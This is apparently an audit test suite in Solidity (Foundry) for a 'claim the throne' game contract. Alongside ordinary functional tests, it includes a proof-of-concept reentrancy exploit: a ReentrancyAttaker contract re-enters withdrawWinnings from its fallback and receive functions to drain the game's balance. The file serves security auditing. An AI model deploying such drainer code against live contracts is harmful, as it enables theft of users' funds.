// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Game} from "../src/GameRefactored.sol";

contract GameTest is Test {
    Game public game;

    address public deployer;
    address public player1;
    address public player2;
    address public player3;
    address public maliciousActor;

    // Initial game parameters for testing
    uint256 public constant INITIAL_CLAIM_FEE = 0.1 ether; // 0.1 ETH
    uint256 public constant GRACE_PERIOD = 1 days; // 1 day in seconds
    uint256 public constant FEE_INCREASE_PERCENTAGE = 10; // 10%
    uint256 public constant PLATFORM_FEE_PERCENTAGE = 5; // 5%

    function setUp() public {
        deployer = makeAddr("deployer");
        player1 = makeAddr("player1");
        player2 = makeAddr("player2");
        player3 = makeAddr("player3");
        maliciousActor = makeAddr("maliciousActor");

        vm.deal(deployer, 10 ether);
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
        vm.deal(player3, 10 ether);
        vm.deal(maliciousActor, 10 ether);

        vm.startPrank(deployer);
        game = new Game(INITIAL_CLAIM_FEE, GRACE_PERIOD, FEE_INCREASE_PERCENTAGE, PLATFORM_FEE_PERCENTAGE);
        vm.stopPrank();
    }

    function testConstructor_RevertInvalidGracePeriod() public {
        vm.expectRevert("Game: Grace period must be greater than zero.");
        new Game(INITIAL_CLAIM_FEE, 0, FEE_INCREASE_PERCENTAGE, PLATFORM_FEE_PERCENTAGE);
    }

    /*//////////////////////////////////////////////////////////////
                              AUDIT TESTS
    //////////////////////////////////////////////////////////////*/

    function test_revert_claimThrone() public {
        address _currentKing = game.currentKing();
        console2.log("Current King: ", _currentKing);
        // Check that the current king is zero before claiming
        assertEq(_currentKing, address(0), "Current King should be zero before claiming");
        vm.startPrank(player1);
        vm.expectRevert("Game: You are already the king. No need to re-claim.");
        game.claimThrone{value: INITIAL_CLAIM_FEE}();
        vm.stopPrank();
    }

    function _claimThroneByUser(address _player, uint256 _fee) internal {
        vm.startPrank(_player);
        game.claimThrone{value: _fee}();
        vm.stopPrank();
    }

    function test_claimThrone_ref() public {
        _claimThroneByUser(player1, INITIAL_CLAIM_FEE);

        uint256 claimTimestamp = block.timestamp;
        assertEq(address(game).balance, INITIAL_CLAIM_FEE, "Contract should have balance equal to INITIAL_CLAIM_FEE");
        uint256 expectedPlatformFee = (INITIAL_CLAIM_FEE * PLATFORM_FEE_PERCENTAGE) / 100;
        assertEq(
            game.pot(),
            INITIAL_CLAIM_FEE - expectedPlatformFee,
            "Pot should be equal to INITIAL_CLAIM_FEE - expectedPlatformFee"
        );
        // Check that the player is now the king
        assertEq(game.currentKing(), player1, "Player 1 should be current king");
        assertEq(game.lastClaimTime(), claimTimestamp, "Last claim time should match the block timestamp, ");
        assertEq(game.gameRound(), 1, "Game round should be incremented by 1 after claiming");
        assertEq(game.totalClaims(), 1, "Total claims should be incremented by 1 after claiming");
        assertEq(game.gameEnded(), false, "Game should not be ended after claiming");
    }

    // this function will test the game round functionality with a winner
    function test_game_round_with_winner() public {
        // claim throne as player 1
        _claimThroneByUser(player1, INITIAL_CLAIM_FEE);

        vm.warp(block.timestamp + 1 hours);

        uint256 expectedNewFee = game.claimFee() + (game.claimFee() * FEE_INCREASE_PERCENTAGE) / 100;
        // claim throne as player 2
        _claimThroneByUser(player2, game.claimFee());
        assertEq(game.claimFee(), expectedNewFee);

        // will revert if grace period not reached
        vm.expectRevert("Game: Grace period has not expired yet.");
        game.declareWinner();
        // increase time to finish the game
        vm.warp(block.timestamp + game.getRemainingTime() + game.lastClaimTime());
        // declare winner
        game.declareWinner();

        uint256 pendingWinAmount = game.pendingWinnings(player2);
        uint256 player2BalanceBeforeWithdraw = player2.balance;
        // withdraw winnings after declaring winner
        vm.startPrank(player2);
        game.withdrawWinnings();
        vm.stopPrank();
        assertEq(
            player2.balance, player2BalanceBeforeWithdraw + pendingWinAmount, "Winner should receive the winnings."
        );
        assertEq(game.gameEnded(), true);
    }

    // this function demostrate reentrancy attack on withdrawWinnings function in Game contract.
    function test_reentrancyAttack_withdrawWinnings() public {
        // deploy reentrancy contract
        ReentrancyAttaker attackerContract = new ReentrancyAttaker(game);
        // fill the game contract with some funds,
        //  to replicate an scenario where the game contract balance is higher than 1 game round pot.
        // so we can demostrate that an attacker can drain more than the winnings funds.
        vm.deal(address(game), 1 ether);

        // contract join game round as player by claiming the throne and paying the entrance fee.
        vm.startPrank(maliciousActor);
        attackerContract.claimThrone{value: INITIAL_CLAIM_FEE}();
        vm.stopPrank();
        assertEq(game.currentKing(), address(attackerContract));

        // warp time until the game round ends.
        vm.warp(block.timestamp + game.getRemainingTime() + game.lastClaimTime());
        // declare winner
        game.declareWinner();
        // track balances before the attack
        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(game).balance;

        // start the attack by calling withdrawWinnings function in game contract.
        vm.startPrank(maliciousActor);
        attackerContract.attack();
        vm.stopPrank();

        console2.log("starting attacker contract balance: ", startingAttackContractBalance);
        console2.log("starting contract balance: ", startingContractBalance);

        console2.log("ending attacker contract balance: ", address(attackerContract).balance);
        console2.log("ending contract balance: ", address(game).balance);
    }
}

contract ReentrancyAttaker {
    Game game;
    uint256 initialEntranceFee;

    constructor(Game _game) {
        game = _game;
    }

    function claimThrone() public payable {
        initialEntranceFee = msg.value;
        game.claimThrone{value: msg.value}();
    }

    function attack() external {
        game.withdrawWinnings();
    }

    function _reentrancy() internal {
        if (address(game).balance >= initialEntranceFee) {
            game.withdrawWinnings();
        }
    }

    fallback() external payable {
        _reentrancy();
    }

    receive() external payable {
        _reentrancy();
    }
}
